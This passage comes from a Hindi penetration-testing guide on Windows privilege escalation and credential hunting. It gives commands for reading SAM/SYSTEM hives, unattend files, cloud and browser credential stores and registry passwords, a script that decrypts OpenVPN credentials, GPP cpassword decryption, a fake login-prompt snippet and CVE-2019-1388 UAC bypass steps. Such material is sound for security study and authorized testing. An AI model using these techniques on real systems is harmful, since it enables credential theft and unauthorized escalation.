reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

यदि आपको उस path के अंदर कोई entry मिलती है, तो वह संभवतः saved SSH key होगी। यह encrypted होती है, लेकिन इसे [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

यदि `ssh-agent` service चालू नहीं है और आप चाहते हैं कि यह boot पर अपने आप शुरू हो, तो चलाएँ:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के ज़रिए किसी मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### अनअटेंडेड फ़ाइलें

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM बैकअप

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

पढ़ी जा सकने वाली Windows Imaging (`.wim`) बैकअप फ़ाइलों में offline `SAM`, `SECURITY`, और `SYSTEM` hives भी हो सकते हैं। स्थानीय रूप से सुलभ backup या image directories को प्राथमिकता दें और कुछ भी extract करने से पहले image के **member names** की जाँच करें; केवल `.wim` filename से यह साबित नहीं होता कि hives उजागर हैं, और सामान्य `install.wim`, `boot.wim`, और recovery images अक्सर गलत सुराग होते हैं। SMB share एक अलग access path है और उसे तभी जाँचना चाहिए जब वह share दायरे में हो। Microsoft की [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) और [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) देखें।

### Cloud Credentials

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Password

पहले एक ऐसी सुविधा उपलब्ध थी, जिससे Group Policy Preferences (GPP) के ज़रिए मशीनों के समूह पर custom local administrator accounts deploy किए जा सकते थे। हालाँकि, इस तरीके में सुरक्षा से जुड़ी गंभीर खामियाँ थीं। पहली बात, SYSVOL में XML फ़ाइलों के रूप में रखे गए Group Policy Objects (GPOs) को कोई भी domain user access कर सकता था। दूसरी बात, इन GPPs में मौजूद passwords AES256 से encrypted थे और इन्हें encrypt करने के लिए इस्तेमाल की गई default key सार्वजनिक रूप से उपलब्ध थी, इसलिए कोई भी authenticated user इन्हें decrypt कर सकता था। यह एक गंभीर जोखिम था, क्योंकि इससे users को elevated privileges मिल सकते थे।

इस जोखिम को कम करने के लिए एक function विकसित किया गया, जो locally cached GPP files को scan करके ऐसी फ़ाइलें खोजता है जिनमें "cpassword" field खाली न हो। ऐसी फ़ाइल मिलने पर, function password को decrypt करके एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल की location की जानकारी होती है, जिससे इस security vulnerability की पहचान और उसे ठीक करने में मदद मिलती है।

इन फ़ाइलों को `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

credentials वाले web.config का उदाहरण:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot में backup archives

सीधे served webroot में रखा पुराना ZIP backup, पहले की configuration files और दोबारा इस्तेमाल किए जा सकने वाले credentials उजागर कर सकता है। इसे exposure मानने से पहले साइट का configured physical path और यह जांचें कि archive वास्तव में HTTP के ज़रिए पहुंच योग्य है या नहीं। Default `C:\inetpub\wwwroot` path सिर्फ़ एक संभावित path है। एक quick local inventory, archives खोले बिना names और sizes की सूची बना सकता है:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

किसी archive के नाम से यह साबित नहीं होता कि उसमें कोई secret है या उससे प्राप्त credential अधिक privilege देता है।

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### लॉग

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### credentials मांगें

आप हमेशा **उपयोगकर्ता से उसके credentials या किसी दूसरे उपयोगकर्ता के credentials दर्ज करने के लिए कह सकते हैं**, अगर आपको लगता है कि उसे वे पता हो सकते हैं (ध्यान दें कि **क्लाइंट से सीधे credentials मांगना** वास्तव में **जोखिम भरा** है):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **credentials वाली संभावित filenames**

ज्ञात files जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe extension के बिना फ़ाइलनाम-सूची वाला variant

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 databases में आमतौर पर `.psafe3` extension का इस्तेमाल होता है। मिलते-जुलते filename को encrypted vault का संभावित संकेत मानें; उसकी मौजूदगी से यह साबित नहीं होता कि आप उसे पढ़ सकते हैं, unlock कर सकते हैं या उसमें stored credentials का उपयोग कर सकते हैं। ऐसी files कहाँ stored हैं, इसकी समीक्षा करते समय accessible user profiles और configured file-sharing roots जाँचें।

पढ़ी जा सकने वाली KeePass `.kdbx` file भी केवल encrypted vault का संकेत है। इसे unlock करने के लिए वास्तविक master-password और configured key-file या account factors की ज़रूरत होती है। यदि authorized review में किसी entry में LM:NT hash pair मिले, तो [pass-the-hash](../ntlm/README.md#pass-the-hash) पर विचार करने से पहले संबंधित account की पुष्टि करें और जाँचें कि NT hash मौजूदा है और target की NTLM service उसे स्वीकार करती है या नहीं। Vault entry अपने आप Administrator या SYSTEM अधिकार नहीं देती; remote service access, account rights और service-execution का कोई अलग step भी उपलब्ध होना चाहिए। Inventory में vault का path और उसकी readability की जानकारी दें, database या stored credentials प्रिंट न करें।

सभी प्रस्तावित files खोजें:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe extension के बिना खोज-कमांड वाला विकल्प

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin में Credentials

आपको इसमें Credentials खोजने के लिए Bin भी देखना चाहिए।

हटाए गए backups और configuration archives के साथ-साथ उन files के लिए भी उपलब्ध Recycle Bin entries देखें जिनके नाम में स्पष्ट रूप से credentials का उल्लेख हो। कोई उपयोगी `.7z`, `.zip`, या `.rar` backup कई महीने पुराना हो सकता है और उसका filename सामान्य हो सकता है। Windows मूल path और deletion time को `$I` record में तथा हटाई गई file को उससे जुड़े `$R` entry में रखता है; archive खोलने से पहले metadata और वर्तमान identity की read access जाँचें। क्या दिखाई देगा, यह volume, user SID और file permissions पर निर्भर करता है, इसलिए खाली listing से यह साबित नहीं होता कि कोई recoverable backup मौजूद नहीं है। Archive के नाम को जाँच के संभावित candidate के रूप में लें, इस बात के प्रमाण के रूप में नहीं कि उसमें कोई मान्य secret है।

यदि हटाई गई `.pfx` file उपलब्ध हो, तो वह **code-signing** के लिए एक सुराग हो सकती है। यदि उसमें उपलब्ध private key हो, तो उस key से बदली हुई PowerShell script पर हस्ताक्षर किए जा सकते हैं; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), और [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)। दूसरे account के अंतर्गत execution के लिए वर्तमान identity को सटीक script में बदलाव करने में सक्षम होना चाहिए, लागू rule को script और target account के लिए परिणामी signature स्वीकार करना चाहिए, और कोई scheduled task या अन्य higher-privilege consumer वास्तव में उसे चलाना चाहिए। केवल `.pfx` filename, certificate subject या writable script से यह पूरी chain साबित नहीं होती। Private-key सामग्री खोलने या task चलाने से पहले metadata, ACLs, policy और scheduled command की जाँच करें।

उपलब्ध messaging-client profile databases, notes और प्राप्त files में भी credentials के सुराग खोजें। BitLocker recovery export HTML या TXT के रूप में, कभी-कभी नाम वाले backup archive के भीतर, रखा हो सकता है। ऐसी सामग्री किसी अलग encrypted data volume तक पहुँच दे सकती है, जिसमें पुराने backups हों; volume और archive की जाँच केवल अधिकृत होने पर करें। यदि backup में `NTDS.dit` हो, तो offline domain credential recovery के लिए उससे मेल खाता `SYSTEM` hive भी आवश्यक है, जैसा कि [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md) में बताया गया है। केवल file names और locked volume से यह साबित नहीं होता कि कोई उपयोगी recovery key या domain backup मौजूद है।

कई programs द्वारा सहेजे गए **passwords recover** करने के लिए आप इसका उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry के अंदर

**Credentials वाली अन्य संभावित registry keys**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**registry से OpenSSH keys निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

जाँचें कि **Chrome या Firefox** के पासवर्ड कहाँ संग्रहीत हैं।\
जाँचें कि **Chrome, Edge या Firefox** के पासवर्ड कहाँ संग्रहीत हैं।\
ब्राउज़र के इतिहास, bookmarks और favourites भी देखें—हो सकता है कि वहाँ कुछ **पासवर्ड संग्रहीत हों**।

वर्तमान उपयोगकर्ता की सामान्य Edge **Default** profile के लिए, `Login Data` `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` में होता है, जबकि `Local State` इसकी parent `User Data` directory में होता है। [Microsoft default profile location का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); दूसरी profile या `UserDataDir` policy इसकी जगह बदल सकती है। फ़ाइल का मौजूद होना सिर्फ credential store का एक सुराग है: पुष्टि करें कि फ़ाइलें पढ़ी जा सकती हैं, लागू उपयोगकर्ता का DPAPI context या अन्य अधिकृत key material उपलब्ध है, और सहेजा गया login किसी अधिक privileged account का है या नहीं। केवल path की enumeration के लिए database खोलना या decrypted passwords दिखाना ज़रूरी नहीं है।

Firefox के लिए, [Mozilla दस्तावेज़ देता है](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) कि profile की `key4.db` और `logins.json` जोड़ी में मौजूद key और encrypted-login फ़ाइलें हैं। इनका मौजूद होना सिर्फ एक सुराग है: जाँचें कि दोनों फ़ाइलें पढ़ी जा सकती हैं या नहीं, उनमें saved entries हैं या नहीं, और यह निष्कर्ष निकालने से पहले कि credentials इस्तेमाल किए जा सकते हैं या नहीं, क्या कोई Primary Password key को सुरक्षित रखता है। अगर recovered credential किसी domain account का है, तो उस account के प्रभावी group-control rights और group के [LAPS password read या decrypt rights](../active-directory-methodology/laps.md) की अलग-अलग समीक्षा करें; केवल browser artifacts से administrator path साबित नहीं होता।

ब्राउज़र से passwords निकालने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में बनी एक technology है, जो अलग-अलग languages के software components के बीच **intercommunication** की सुविधा देती है। हर COM component की **पहचान class ID (CLSID) से होती है**, और हर component एक या अधिक interfaces के ज़रिए functionality उपलब्ध कराता है, जिनकी पहचान interface IDs (IIDs) से होती है।

COM classes और interfaces क्रमशः **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत registry में परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को merge करके बनाई जाती है।

इस registry के CLSIDs में child registry **InProcServer32** मिलती है, जिसमें **default value** एक **DLL** की ओर संकेत करती है और `ThreadingModel` नाम की value होती है। यह **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकती है।

![ब्राउज़र इतिहास - COM DLL Overwriting: इस registry के CLSIDs में child registry InProcServer32 मिलती है, जिसमें एक default value होती है जो DLL की ओर संकेत करती है और एक value...](<../../images/image (729).png>)

मूल रूप से, अगर आप निष्पादित होने वाली किसी भी **DLL को overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं—यदि उस DLL को कोई दूसरा उपयोगकर्ता निष्पादित करने वाला हो।

यह जानने के लिए कि attackers persistence mechanism के रूप में COM Hijacking का उपयोग कैसे करते हैं, देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **फ़ाइलों और registry में सामान्य password खोज**

**फ़ाइलों के contents खोजें**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**किसी निश्चित फ़ाइल नाम वाली फ़ाइल खोजें**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Registry में key names और passwords खोजें**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Passwords खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है। मैंने यह plugin victim के अंदर credentials खोजने वाले हर metasploit POST module को **automatically execute** करने के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस page पर बताए गए passwords वाली सभी files को automatically खोजता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) किसी system से password निकालने के लिए एक और बेहतरीन tool है।

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई ऐसे tools के **sessions**, **usernames** और **passwords** खोजता है जो इस data को clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY और RDP)।

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रही कोई process full access के साथ एक नई process खोलती है** (`OpenProcess()`)। वही process **कम privileges के साथ एक नई process भी बनाती है** (`CreateProcess()`), **जो main process के सभी खुले handles विरासत में लेती है**।\
फिर, अगर आपके पास **कम privileges वाली process का full access** है, तो आप `OpenProcess()` से बनाई गई privileged process का **open handle प्राप्त कर सकते हैं** और **shellcode inject कर सकते हैं**।\
[इस vulnerability का पता लगाने और इसका फायदा उठाने के बारे में अधिक जानकारी के लिए यह उदाहरण पढ़ें।](leaked-handle-exploitation.md)\
[अलग-अलग permission levels के साथ विरासत में मिले processes और threads के और अधिक open handles (सिर्फ full access वाले नहीं) को test करने और उनका दुरुपयोग करने के बारे में अधिक विस्तृत जानकारी के लिए यह **दूसरी पोस्ट पढ़ें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, processes के बीच communication और data transfer सक्षम करते हैं।

Windows में **Named Pipes** नाम का एक feature है, जो असंबंधित processes को अलग-अलग networks पर भी data share करने देता है। यह client/server architecture जैसा है, जिसमें roles को **named pipe server** और **named pipe client** के रूप में परिभाषित किया जाता है।

जब कोई **client** pipe के ज़रिए data भेजता है, तो pipe सेटअप करने वाला **server**, **client की पहचान अपनाने** में सक्षम होता है—बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। ऐसे **privileged process** की पहचान करना, जो उस pipe के ज़रिए communicate करता है जिसकी आप नकल कर सकते हैं, **अधिक privileges हासिल करने** का अवसर देता है: जब वह process आपके बनाए pipe के साथ interact करे, तो आप उसकी पहचान अपना सकते हैं। ऐसा attack करने के निर्देशों के लिए उपयोगी guides [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकती हैं।

इसके अलावा, यह tool **Burp जैसे tool से named pipe communication को intercept करने** देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool privescs ढूँढ़ने के लिए सभी pipes को list और देखने देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode में Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) को expose करती है। कोई remote authenticated client, mailslot-आधारित async event path का दुरुपयोग करके `ClientAttach` को `NETWORK SERVICE` द्वारा writable किसी भी मौजूदा file में arbitrary **4-byte write** में बदल सकता है, और फिर Telephony admin rights हासिल करके service के रूप में arbitrary DLL load कर सकता है। पूरा flow:

- `pszDomainUser` को किसी writable मौजूदा path पर set करके `ClientAttach` करें → service उसे `CreateFileW(..., OPEN_EXISTING)` के ज़रिए खोलती है और async event writes के लिए इस्तेमाल करती है।
- हर event, `Initialize` से attacker-controlled `InitContext` को उस handle पर लिखता है। `LRegisterRequestRecipient` (`Req_Func 61`) से line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` के तहत खुद को जोड़ें, reconnect करें, फिर arbitrary DLL path के साथ `GetUIDllName` call करके `NETWORK SERVICE` के रूप में `TSPI_providerUIIdentify` execute करें।

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows में execute हो सकने वाली File Extensions

यह page देखें **[https://filesec.io/](https://filesec.io/)**

### Markdown renderers के ज़रिए Protocol handler / ShellExecute abuse

`ShellExecuteExW` को forward किए गए clickable Markdown links खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और current user के रूप में attacker-controlled files execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Passwords के लिए Command Lines की निगरानी**

किसी user के रूप में shell मिलने पर, scheduled tasks या अन्य processes execute हो रहे हो सकते हैं जो **command line पर credentials pass करते हैं**। नीचे दी गई script हर दो seconds में process command lines capture करती है और current state की तुलना previous state से करके कोई भी अंतर output करती है।

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Processes से passwords चुराना

## Low Priv User से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (console या RDP के ज़रिए) का access है और UAC enabled है, तो Microsoft Windows के कुछ versions में किसी unprivileged user से terminal या "NT\AUTHORITY SYSTEM" जैसे किसी अन्य process को चलाना संभव है।

इससे एक ही vulnerability के ज़रिए privileges escalate करना और UAC को bypass करना, दोनों संभव हो जाते हैं। इसके अतिरिक्त, कुछ भी install करने की ज़रूरत नहीं है और इस प्रक्रिया के दौरान इस्तेमाल किया गया binary Microsoft द्वारा signed और जारी किया गया है।

प्रभावित systems में से कुछ ये हैं:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

इस vulnerability को exploit करने के लिए, निम्नलिखित steps करना आवश्यक है:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

